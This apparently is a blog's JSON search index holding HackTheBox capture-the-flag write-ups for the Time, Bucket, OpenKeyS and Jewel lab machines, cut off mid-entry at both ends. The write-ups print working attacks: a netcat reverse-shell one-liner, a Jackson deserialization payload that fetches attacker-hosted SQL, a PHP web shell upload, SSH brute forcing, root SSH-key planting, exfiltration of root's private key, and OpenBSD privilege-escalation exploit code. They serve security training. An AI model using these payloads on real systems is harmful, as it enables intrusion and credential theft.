/dev/tcp/tun0/4242 0&amp;gt;&amp;amp;1Third, open nc portnc -nvlp 4242Fourth, run composermrb3n@academy:~$ sudo composer hackshell pops in netcat immediatelyroot@academy:~# cat root.txtcat root.txt29a4ab3f************************" }, { "title": "Hackthebox - Time", "url": "/posts/time/", "categories": "hackthebox, linux", "tags": "jackson 2.9.9.1, cve-2019-12384, cronjob", "date": "2020-10-24 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.214 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.214PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Online JSON parserWeb_serverTitle: Online JSON parser : What is JSON PARSER ONLINE? JSON PARSER ONLINE lets you parse JSON string into a pretty and colorful JSON tree view. It parse JSON String and converts it into a human readable format string. there are two options Option1: Beautify: convert JSON single string code into a JSON tree view. Option2: Validate (beta!): Validates a JSON string against RFC 4627 (The application/json media type for JavaScript Object Notation) and against the JavaScript language specification. Error in Validate (beta!) option when Validate with normal text string it through an error Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;test&#39;: was expecting &#39;null&#39;, &#39;true&#39;, &#39;false&#39; or NaN this error not indicate any vulnerability, this error occurs because of the serialization of a Javascript object. All String values MUST be enclosed in double quotes in JSON. if we sent same string inside double quotes it works fine. But the Error tells that the server using JACKSON JSON parser, Jackson : Jackson is a high-performance JSON processor for Java. More than that, Jackson is a suite of data-processing tools for Java (and the JVM platform), Jackson has been known as “the Java JSON library” or “the best JSON parser for Java”. this server using Jackson library for deserializing JSONs vulnerability : de-serialization vulnerability CVE-2019-12384Jackson gadgets - Anatomy of a vulnerability doyensec.com Reportan attacker may leverage this de-serialization vulnerability to trigger attacks such as Server-Side Request Forgery (SSRF) and remote code execution. attack this attack produce in 2 steps First, serve the inject.sql INIT file through a simple http server, Second, call the script from the server. User ExploitFirst, create inject.sqlCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; }$$;CALL SHELLEXEC(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;tun0&amp;gt; 4141 &amp;gt;/tmp/f&#39;)Second, serve the inject.sql INIT file through a simple http serversudo python -m SimpleHTTPServer 80Third, code that pass into the validate option[ &quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, { &quot;url&quot;: &quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://&amp;lt;tun0&amp;gt;/injection.sql&#39;&quot; }]Fourth, open ncnc -nvlp 4141shell,listening on [any] 4141 ...connect to [10.10.15.151] from (UNKNOWN) [10.10.10.214] 54528/bin/sh: 0: can&#39;t access tty; job control turned off$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;pericles@time:/var/www/html$ user flag pericles@time:/var/www/html$ cat ~/user.txtcat ~/user.txt76086ade************************ Local Enumerationrunning lipeas found a script owned by user pericles[+] .sh files in pathYou own the script: /usr/bin/timer_backup.shtimer_backup.shpericles@time:/home/pericles$ ls -lsh /usr/bin/timer_backup.shls -lsh /usr/bin/timer_backup.sh-rwxrw-rw- 1 pericles pericles 88 Nov 18 04:00 /usr/bin/timer_backup.shpericles@time:/home/pericles$ cat /usr/bin/timer_backup.shcat /usr/bin/timer_backup.sh#!/bin/bashzip -r website.bak.zip /var/www/html &amp;amp;&amp;amp; mv website.bak.zip /root/backup.zip script specified some root task that means script is running as root this script backup complete server directory in root script is running in every ~10sec and after that script get resetRoot Exploitputting any reverse-shell in the timer_backup.sh to get a root shell doesn’t works properly because script exits as soon as it executed and so shell too.simplest way to get proper root shell is to put ssh key in the script so that we can ssh as root.public ssh key create ssh key: ssh-keygen -f time copy public ssh key: cat time.pub ssh-rsa AAAA...ZXMk= put ssh key in timer_backup.sh script echo &quot;echo &#39;ssh-rsa AAAA...ZXMk=&#39; &amp;gt;&amp;gt; /root/.ssh/authorized_keys&quot; &amp;gt; /usr/bin/timer_backup.sh ssh in: chdom 600 time ssh -i time root@10.10.10.214 root@time:~# cat root.txtdffebc49************************ cron tab that occurs root privesccrontab -u root -l*/5 * * * * cp /root/timer_backup.sh /usr/bin/timer_backup.sh; chown pericles:pericles /usr/bin/timer.sh; chmod 766 /usr/bin/timer_backup.sh" }, { "title": "Hackthebox - Bucket", "url": "/posts/bucket/", "categories": "hackthebox, linux", "tags": "aws, awscli, s3 bucket, php pd4ml", "date": "2020-10-19 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.193 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.193PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://bucket.htb/Web_server 10.10.10.212 redirected to bucket.htb , add bucket.htb in the /etc/hosts file . crawling through bucket.htb i found some links in the source-code that indicates potential subdomain . &amp;lt;img src=&quot;http://s3.bucket.htb/adserver/images/bug.jpg&quot; alt=&quot;Bug&quot; height=&quot;160&quot; width=&quot;160&quot;&amp;gt;&amp;lt;img src=&quot;http://s3.bucket.htb/adserver/images/malware.png&quot; alt=&quot;Malware&quot; height=&quot;160&quot; width=&quot;160&quot;&amp;gt;&amp;lt;img src=&quot;http://s3.bucket.htb/adserver/images/cloud.png&quot; alt=&quot;cheer&quot; height=&quot;160&quot; width=&quot;160&quot;&amp;gt; add s3.bucket.htb in the /etc/hosts filegobuster s3.bucket.htbgobuster dir -u http://s3.bucket.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50/health (Status: 200)/shell (Status: 200)/health goto s3.bucket.htb/health/ shows {“status”: “running”} goto s3.bucket.htb/health shows {“services”: {“s3”: “running”, “dynamodb”: “running”}} so 2 services running, whom i know nothing about , ask googles3 : Amazon S3 or Amazon Simple Storage Service is a service offered by Amazon Web Services that provides object storage through a web service interface. so s3 is a amazon aws service which store data inside digital buckets .dynamodb : Amazon DynamoDB is a fully managed proprietary NoSQL database service that supports key-value and document data structures and is offered by Amazon.com as part of the Amazon Web Services portfolio. so dynamodb is a database service that manage bucket data . these services running on hypercorn-h11 server , DOC . google also indicates that the dynamodb is a NoSQL type database ./shell s3.bucket.htb/shell/ revealed a interactive DynamoDB JavaScript Shell . using this shell we can talk to the backend database service and dump data from the server . heading to the API Templates tab i found some prebuilt templates . i read API Docs and build my own simple templates . reading through google i found a awscli tool similar as webshell but can run from the terminal, toolawscliConfigure awscli before running awscli we need to configure it but when i configuring it asking for access_key and secret_key and i don’t have these or don’t know about some googling i found a document doc tells any credentials to work aws configure access_key:ANYTHINGTOCONFIGUREEsecret_key:zxcvbnmasDFGH/QWERTYU/pOiUytZSXDCFVGBNJMregion:us-west-1output:json Dump Data First, find the table name aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ | jq -r . { &quot;TableNames&quot;: [ &quot;users&quot; ]} Second, scan users table aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ | jq -r . { &quot;Count&quot;: 3, &quot;Items&quot;: [ { &quot;username&quot;: { &quot;S&quot;: &quot;Mgmt&quot; }, &quot;password&quot;: { &quot;S&quot;: &quot;Management@#1@#&quot; } }, { &quot;username&quot;: { &quot;S&quot;: &quot;Cloudadm&quot; }, &quot;password&quot;: { &quot;S&quot;: &quot;Welcome123!&quot; } }, { &quot;username&quot;: { &quot;S&quot;: &quot;Sysadm&quot; }, &quot;password&quot;: { &quot;S&quot;: &quot;n2vM-&amp;lt;_K_Q:.Aa2&quot; } } ], &quot;ScannedCount&quot;: 3, &quot;ConsumedCapacity&quot;: null } credsMgmt:Management@#1@#Cloudadm:Welcome123!Sysadm:n2vM-&amp;lt;_K_Q:.Aa2Enumerating through awscli investing some time in awscli tool i found that i can list all buckets aws --endpoint-url=http://s3.bucket.htb s3api list-buckets | jq . { &quot;Owner&quot;: { &quot;DisplayName&quot;: &quot;webfile&quot;, &quot;ID&quot;: &quot;bcaf1ffd86f41161ca5fb16fd081034f&quot; }, &quot;Buckets&quot;: [ { &quot;CreationDate&quot;: &quot;2020-11-04T03:32:03.881865Z&quot;, &quot;Name&quot;: &quot;adserver&quot; } ] } threre is only one bucket &quot;Name&quot;: &quot;adserver&quot; view inside adserver bucket aws --endpoint-url=http://s3.bucket.htb s3api list-objects --bucket adserver | jq . { &quot;Contents&quot;: [ { &quot;LastModified&quot;: &quot;2020-11-04T03:42:13.000Z&quot;, &quot;ETag&quot;: &quot;\\&quot;25118cbb11c412f4b517249e6e877dc3\\&quot;&quot;, &quot;StorageClass&quot;: &quot;STANDARD&quot;, &quot;Key&quot;: &quot;images/bug.jpg&quot;, &quot;Owner&quot;: { &quot;DisplayName&quot;: &quot;webfile&quot;, &quot;ID&quot;: &quot;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&quot; }, &quot;Size&quot;: 37840 }, { &quot;LastModified&quot;: &quot;2020-11-04T03:42:13.000Z&quot;, &quot;ETag&quot;: &quot;\\&quot;4d7905acad5d78b01085e461f78eae43\\&quot;&quot;, &quot;StorageClass&quot;: &quot;STANDARD&quot;, &quot;Key&quot;: &quot;images/cloud.png&quot;, &quot;Owner&quot;: { &quot;DisplayName&quot;: &quot;webfile&quot;, &quot;ID&quot;: &quot;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&quot; }, &quot;Size&quot;: 51485 }, { &quot;LastModified&quot;: &quot;2020-11-04T03:42:13.000Z&quot;, &quot;ETag&quot;: &quot;\\&quot;b22715647e087104f6b1ff7c0ce0731c\\&quot;&quot;, &quot;StorageClass&quot;: &quot;STANDARD&quot;, &quot;Key&quot;: &quot;images/malware.png&quot;, &quot;Owner&quot;: { &quot;DisplayName&quot;: &quot;webfile&quot;, &quot;ID&quot;: &quot;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&quot; }, &quot;Size&quot;: 16486 }, { &quot;LastModified&quot;: &quot;2020-11-04T03:42:13.000Z&quot;, &quot;ETag&quot;: &quot;\\&quot;dadef349eabdda42a5ff5118a5b9c229\\&quot;&quot;, &quot;StorageClass&quot;: &quot;STANDARD&quot;, &quot;Key&quot;: &quot;index.html&quot;, &quot;Owner&quot;: { &quot;DisplayName&quot;: &quot;webfile&quot;, &quot;ID&quot;: &quot;75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a&quot; }, &quot;Size&quot;: 5344 } ] } these files looks like bucket.htb source files these file sync in every min or less to the main server I try to upload file in the bucket and check if it is accessable from bucket.htb aws --endpoint-url=http://s3.bucket.htb s3 cp test.html s3://adserver upload: ./test.html to s3://adserver/test.html aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver . PRE images/2020-11-04 04:16:12 5344 index.html2020-11-04 04:17:01 47 test.html curl -I http://bucket.htb/test.html HTTP/1.1 200 OKDate: Wed, 04 Nov 2020 04:17:18 GMTServer: Apache/2.4.41 (Ubuntu)Last-Modified: Wed, 04 Nov 2020 04:17:04 GMTETag: &quot;2f-5b3404073f723&quot;Accept-Ranges: bytesContent-Length: 47Content-Type: text/html some notable things, uploaded file sync only once and the automatically deleted after it file takes 30-60sec to sync I can upload php shell and access from the main server user Exploit First, upload php shell in the bucket aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver Second, open netcat listener nc -nvlp 4141 Third, after sometime i go to bucket.htb/shell.php and shell pops in the netcat got www-data shellEnumerating www-datacat /etc/passwd#roy:x:1000:1000:,,,:/home/roy:/bin/bash don’t find any thing in the www-data only get the user roy I check if user roy can has ssh enable ssh roy@10.10.10.212 roy@10.10.10.212&#39;s password: so roy has ssh enable i am thinking about bruteforcing ssh but first try to use creds that dumped from the database hydra -l roy -P wordlist 10.10.10.212 -t 4 ssh Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-04 10:19:34[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task[DATA] attacking ssh://10.10.10.212:22/[22][ssh] host: 10.10.10.212 login: roy password: n2vM-&amp;lt;_K_Q:.Aa21 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-04 10:19:42 found reused password n2vM-&amp;lt;_K_Q:.Aa2credsroy:n2vM-&amp;lt;_K_Q:.Aa2ssh royssh roy@10.10.10.212roy@10.10.10.212&#39;s password: n2vM-&amp;lt;_K_Q:.Aa2Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)roy@bucket:~$ cat user.txtdd3f563b************************Enumerate user roy check network roy@bucket:~$ ss -lnpt State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 511 127.0.0.1:8000 0.0.0.0:* there is a local server running on port 8000 inside /var/www directory there are two directories drwxr-x---+ 4 root root 4096 Sep 23 10:56 bucket-appdrwxr-xr-x 2 root root 4096 Nov 4 08:20 html goto local server directory /var/www/bucket-app/ found index.php roy@bucket:/var/www/bucket-app$ ls -la | grep index.php`-rwxr-x---+ 1 root root 17222 Sep 23 03:32 index.php` index.php contains php code snippet. &amp;lt;?phprequire &#39;vendor/autoload.php&#39;;use Aws\\DynamoDb\\DynamoDbClient;if($_SERVER[&quot;REQUEST_METHOD&quot;]===&quot;POST&quot;) { if($_POST[&quot;action&quot;]===&quot;get_alerts&quot;) { date_default_timezone_set(&#39;America/New_York&#39;); $client = new DynamoDbClient([ &#39;profile&#39; =&amp;gt; &#39;default&#39;, &#39;region&#39; =&amp;gt; &#39;us-east-1&#39;, &#39;version&#39; =&amp;gt; &#39;latest&#39;, &#39;endpoint&#39; =&amp;gt; &#39;http://localhost:4566&#39; ]); $iterator = $client-&amp;gt;getIterator(&#39;Scan&#39;, array( &#39;TableName&#39; =&amp;gt; &#39;alerts&#39;, &#39;FilterExpression&#39; =&amp;gt; &quot;title = :title&quot;, &#39;ExpressionAttributeValues&#39; =&amp;gt; array(&quot;:title&quot;=&amp;gt;array(&quot;S&quot;=&amp;gt;&quot;Ransomware&quot;)), )); foreach ($iterator as $item) { $name=rand(1,10000).&#39;.html&#39;; file_put_contents(&#39;files/&#39;.$name,$item[&quot;data&quot;]); } passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf&quot;); }}else{?&amp;gt; script breakdown line 04, First if statement if($_SERVER[&quot;REQUEST_METHOD&quot;]===&quot;POST&quot;) this define that the script execute if user send a POST request . line 05, Second if statement if($_POST[&quot;action&quot;]===&quot;get_alerts&quot;) this line defines that if server gets a post request its action must be a get_alerts so i need to send a POST request with action=get_alerts line 07-12, client variable $client = new DynamoDbClient([ &#39;profile&#39; =&amp;gt; &#39;default&#39;, &#39;region&#39; =&amp;gt; &#39;us-east-1&#39;, &#39;version&#39; =&amp;gt; &#39;latest&#39;, &#39;endpoint&#39; =&amp;gt; &#39;http://localhost:4566&#39; ]); this code configure aws client connection line 14-18, iteration variable $iterator = $client-&amp;gt;getIterator(&#39;Scan&#39;, array( &#39;TableName&#39; =&amp;gt; &#39;alerts&#39;, &#39;FilterExpression&#39; =&amp;gt; &quot;title = :title&quot;, &#39;ExpressionAttributeValues&#39; =&amp;gt; array(&quot;:title&quot;=&amp;gt;array(&quot;S&quot;=&amp;gt;&quot;Ransomware&quot;)), )); this code iterate data from the database but there there is only one table i already saw that I think i need to create a table table before trigger that script so i need to create a alerts table which contains item Ransomwar line 20-23, foreach loop through the $iterator variable foreach ($iterator as $item) { $name=rand(1,10000).&#39;.html&#39;; file_put_contents(&#39;files/&#39;.$name,$item[&quot;data&quot;]); } this code loop data that iterate from that table and set on $item variable the $item data go inside the php function file_put_contents , php documentation this function write $item variable data inside files directory as the name that $name variable defines example-name: 4141.html roy@bucket:/var/www/bucket-app$ ls -la | grep filesdrwxr-x---+ 2 root root 4096 Sep 23 03:29 files line 24, passthru function, php documentation passthru(&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf&quot;); after example-name: 4141.html file generated, this file go through that php function passthru this function copy pd4ml_demo.jar library form bucket-app directory roy@bucket:/var/www/bucket-app$ ls -la | grep pd4ml`-rwxr-x---+ 1 root root 808729 Jun 10 11:50 pd4ml_demo.jar` and then execute pd4cmd from pd4ml library PD4ML is a Java library, which makes possible to create PDF documents from Java and JSP applications using HTML as template language here is the pd4cmd documentation from pd4ml tool so what is happening here is that the pd4cmd convert html file into a pdf file and store in the files/ direcotry as result.pdf Exploit Surface reading through the pd4ml documentation i found a PDF Attachments feature . PDF Attachments doc i can use this feature to import root.txt as well as id_rsa in result.txt because this library run as root for this to work i need to set pd4ml:attachment function inside the html file i can do that by setting pd4ml:attachment function as data in the table alerts inside item RansomwareRoot PrivescFirst, create alerts tableaws dynamodb create-table \\ --table-name alerts \\ --attribute-definitions \\ AttributeName=title,AttributeType=S \\ --key-schema \\ AttributeName=title,KeyType=HASH \\--provisioned-throughput \\ ReadCapacityUnits=10,WriteCapacityUnits=5 \\ --endpoint-url=http://s3.bucket.htbSecond, put Ransomware itemaws dynamodb put-item \\--table-name alerts \\--item \\ &#39;{&quot;title&quot;: {&quot;S&quot;: &quot;Ransomware&quot;}, &quot;data&quot;: {&quot;S&quot;: &quot;&amp;lt;pd4ml:attachment description=\\&quot;attached.txt\\&quot; icon=\\&quot;PushPin\\&quot;&amp;gt;file:///root/.ssh/id_rsa&amp;lt;/pd4ml:attachment&amp;gt;&quot;}}&#39; \\ --endpoint-url=http://s3.bucket.htbspecify pd4ml:attachment function as item Ransomware data so when pd4cmd convert html file into pdf it also attech that file i specifiedThird, create tunnel on port 8000 with sshssh -L 8000:127.0.0.1:8000 roy@bucket.htbFourth, send a post request to 127.0.0.1:8000curl -X POST -d &quot;action=get_alerts&quot; http://127.0.0.1:8000/ -vas soon as request send successfully result.pdf file createdNote, result.pdf file deletes immediately after created in less then ~10sec and created tableto tackle this problem i use sshpass with scp and copy result.pdf file in my local machine as soon as it createdsshpass -p &quot;n2vM-&amp;lt;_K_Q:.Aa2&quot; scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf result.pdf" }, { "title": "Hackthebox - OpenkeyS", "url": "/posts/openkeyS/", "categories": "hackthebox, linux", "tags": "openbsd 6.6, cve-2019-19521, cve-2019-19520, cve-2019-19522", "date": "2020-10-13 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.199 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.199PORT STATE SERVICE VERSION+22/tcp open ssh OpenSSH 8.1 (protocol 2.0)+80/tcp open http OpenBSD httpd|_http-title: Site doesn&#39;t have a title (text/html).Device type: general purpose|firewallRunning (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%) OS : OpenBSDWeb_serverGobustergobuster dir -u 10.10.10.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40/includes (Status: 301) 10.10.10.199 on port 80 has a login page Title : OpenKeyS - Retrieve your OpenSSH Keys http://10.10.10.199/includes/ Index of /includes/../ 23-Jun-2020 08:18 -auth.php 22-Jun-2020 13:24 1373auth.php.swp 17-Jun-2020 14:57 12288 Swap file created by the Vi text editor or one of its variants such as Vim (Vi iMproved) and gVim; stores the recovery version of a file that is being edited in the program; also serves as a lock file so that no other Vi editing session can concurrently write to the file. strings auth.php.swp get a username: jennifer Recover auth.php file vim -r auth.php.swp Inside auth.php file function authenticate($username, $password){ $cmd = escapeshellcmd(&quot;../auth_helpers/check_auth &quot; . $username . &quot; &quot; . $password); system($cmd, $retcode); return $retcode;} The PHP script makes use of /auth_helpers/check_auth to authenticate users. try to get the file, which is an OpenBSD shared object. http://10.10.10.199/auth_helpers/check_auth-rw-r--r-- 1 x00tex x00tex 12288 Oct 14 10:21 check_auth check_auth file file is not executing in linux because it made form OpenBSD. i search for OpenBSD check_auth and found Authentication Bypass and Local Privilege Escalation Vulnerabilities.User ExploitExploit : CVE-2019-19521 (Authentication Bypass)Report : qualys.comExploit surface: if an attacker specifies the username “-schallenge” (or “-schallenge:passwd” to force a passwd-style authentication), then the authentication is automatically successful and therefore bypassed. but still getting Authentication denied error i don’t find the use of username that i found and when using -schallenge as username it gives an error OpenSSH key not found for user &quot;-schallenge&quot; in auth.php script, there are some session variables defined that applicable in session cookie. function init_session(){ $_SESSION[&quot;logged_in&quot;] = True; $_SESSION[&quot;login_time&quot;] = $_SERVER[&#39;REQUEST_TIME&#39;]; $_SESSION[&quot;last_activity&quot;] = $_SERVER[&#39;REQUEST_TIME&#39;]; $_SESSION[&quot;remote_addr&quot;] = $_SERVER[&#39;REMOTE_ADDR&#39;]; $_SESSION[&quot;user_agent&quot;] = $_SERVER[&#39;HTTP_USER_AGENT&#39;]; $_SESSION[&quot;username&quot;] = $_REQUEST[&#39;username&#39;];} there is also a username variable available, $_SESSION[&quot;username&quot;] = $_REQUEST[&#39;username&#39;]; send request with username=jennifer curl -L http://10.10.10.199/index.php -d &quot;username=-schallenge&amp;amp;password=password&quot; -b &quot;PHPSESSID=qqe08df89r71d7jb7i869857uh;username=jennifer&quot; output, get ssh_key for user jennifer OpenSSH key for user jennifer -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn...qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=-----END OPENSSH PRIVATE KEY----- sshchmod 600 ssh_keyssh -i ssh_key jennifer@10.10.10.199openkeys$ whoami jenniferopenkeys$ cat user.txt36ab2123************************Local Enumerationopenkeys$ uname -aOpenBSD openkeys.htb 6.6 GENERIC#353 amd64OpenBSD version : 6.6Local Exploit : CVE-2019-19520: Local privilege escalation via xlock from that same “qualys” reportvulnerability : On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is set-group-ID “auth”, not set-user-ID; the following check is therefore incomplete and should use issetugid() instead, A local attacker can exploit this vulnerability and dlopen() their own driver to obtain the privileges of the group “auth”.Local Exploit : CVE-2019-19522: Local privilege escalation via S/Key and YubiKey from that same “qualys” reportvulnerability : If the S/Key or YubiKey authentication type is enabled, then a local attacker can exploit the privileges of the group “auth” to obtain the full privileges of the user “root” so there are two exploit to get root First get into “auth” group using CVE-2019-19520 and then get “root” using CVE-2019-19522Root Exploit I found a script that automatically done that work. Script ManualCVE-2019-19520First, create swrast_dri.c file -openkeys$ cat &amp;gt; swrast_dri.c &amp;lt;&amp;lt; &quot;EOF&quot;#include &amp;lt;paths.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;static void __attribute__ ((constructor)) _init (void) { gid_t rgid, egid, sgid; if (getresgid(&amp;amp;rgid, &amp;amp;egid, &amp;amp;sgid) != 0) _exit(__LINE__); if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__); char * const argv[] = { _PATH_KSHELL, NULL }; execve(argv[0], argv, NULL); _exit(__LINE__);}EOFSecond, compile it -openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.copenkeys$ lsswrast_dri.c swrast_dri.soThird, run -openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &amp;amp;[1] 56546openkeys$ _XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to rootopenkeys$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66openkeys$ id+uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel) Now we are in auth group.CVE-2019-19522First, create root skey and chmod it -openkeys$ echo &#39;root md5 0100 obsd91335 8b6d96e0ef1b1c21&#39; &amp;gt; /etc/skey/rootopenkeys$ chmod 0600 /etc/skey/rootSecond, run -$ env -i TERM=vt220 su -l -a skeyotp-md5 99 obsd91335S/Key Password: EGG LARD GROW HOG DRAG LAINopenkeys# whoami rootRoot shellopenkeys# whoami rootopenkeys# root.txtf3a553b1************************" }, { "title": "Hackthebox - Jewel", "url": "/posts/jewel/", "categories": "hackthebox, linux", "tags": "rails 5.2.2.1, cve-2020-8165, sudo 2fa, gtfobins gem", "date": "2020-10-11 18:30:00 +0000", "snippet": " ScanningNmapports=$(sudo nmap -p- --min-rate=1000 &quot;$1&quot; | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) &amp;amp;&amp;amp; sudo nmap -p$ports -sV -sC -oN nmap.txt &quot;$1&quot;PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)| 256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)|_ 256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)8000/tcp open http Apache httpd 2.4.38|_http-generator: gitweb/2.20.1 git/2.20.1| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.38 (Debian)| http-title: 10.10.10.211 Git|_Requested resource was http://10.10.10.211:8000/gitweb/8080/tcp open http nginx 1.14.2 (Phusion Passenger 6.0.6)|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6|_http-title: BL0G! Port 8080 is a BLOG! webapp and port 8000 containts the source code of the webapp. we can greb the git repo from http://10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=5d6f436256c9575fbc7b1fb9621b18f0f8656741;sf=tgz master commit snapshot. get git-5d6f436.tar.gz archive file.source code enumerating extracting the archive ❯ tar -xvzf git-5d6f436.tar.gz ❯ tree .git-5d6f436 ├── app |... [snip] ... | ├── bd.sql... [snip] ... 47 directories, 116 files Found 2 usernames and password hashes in bd.sql file ❯ grep -E &quot;bill&quot;\\|&quot;jennifer&quot; bd.sql1 bill bill@mail.htb 2020-08-25 08:13:58.662464 2020-08-25 08:13:58.662464 $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW2 jennifer jennifer@mail.htb 2020-08-25 08:54:42.8483 2020-08-25 08:54:42.8483 $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy hashes are not crackable. this webapp written in ruby and there is a tool that can scan for potential vulnerabilities in ruby project - brakeman but the tool don’t find any useful vulnerabilities. viewing the gemfile which contains all require dependencies for the project found the ruby rail version: ❯ grep -n rail Gemfile 7:gem &#39;rails&#39;, &#39;= 5.2.2.1&#39; viewing the release notes this version is released on March 13, 2019 and there is a de-serialization vulnerability in the rails &amp;lt; 5.2.4.3, rails &amp;lt; 6.0.3.1 CVE-2020-8165: A de-serialization of untrusted data vulnerability exists in rails &amp;lt; 5.2.4.3, rails &amp;lt; 6.0.3.1 that can allow an attacker to un-marshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE. Exploit PoC: masahiro331@github.com rail May 18, 2020 release address this issue and from here found detailed document for this exploit what this report says is that - There is potentially unexpected behavior in the MemCacheStore and RedisCacheStore where, when untrusted user input is written to the cache store using the raw: true parameter, re-reading the result from the cache can evaluate the user input as a Marshalled object instead of plain text. Vulnerable code looks like: data = cache.fetch(&quot;demo&quot;, raw: true) { untrusted_string } verifying this in our code: ❯ grep -r &#39;raw: true&#39;app/controllers/application_controller.rb: @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) doapp/controllers/users_controller.rb: @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) {user_params[:username]}❯ sed -n 32,49p app/controllers/users_controller.rb def update @user = User.find(params[:id]) if @user &amp;amp;&amp;amp; @user == current_user cache = ActiveSupport::Cache::RedisCacheStore.new(url: &quot;redis://127.0.0.1:6379/0&quot;) cache.delete(&quot;username_#{session[:user_id]}&quot;) @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) {user_params[:username]} if @user.update(user_params) flash[:success] = &quot;Your account was updated successfully&quot; redirect_to articles_path else cache.delete(&quot;username_#{session[:user_id]}&quot;) render &#39;edit&#39; end else flash[:danger] = &quot;Not authorized&quot; redirect_to articles_path end end❯ sed -n 29,40p app/controllers/application_controller.rb def current_username if session[:user_id] cache = ActiveSupport::Cache::RedisCacheStore.new(url: &quot;redis://127.0.0.1:6379/0&quot;) @current_username = cache.fetch(&quot;username_#{session[:user_id]}&quot;, raw: true) do @current_user = current_user @current_username = 